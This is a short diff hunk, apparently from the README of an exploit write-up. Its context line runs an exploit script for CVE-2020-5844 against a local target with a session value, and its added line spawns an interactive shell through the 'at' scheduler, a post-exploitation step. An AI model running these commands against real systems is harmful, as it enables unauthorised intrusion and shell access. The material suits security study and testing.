@@ -51,7 +51,7 @@ python3 exploit-CVE-2020-5844.py -t 127.0.0.1 8888 -p g4e01qdgk36mfdh90hvcc54umq
 ```
 
 ```
-
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 ```
 
 ```
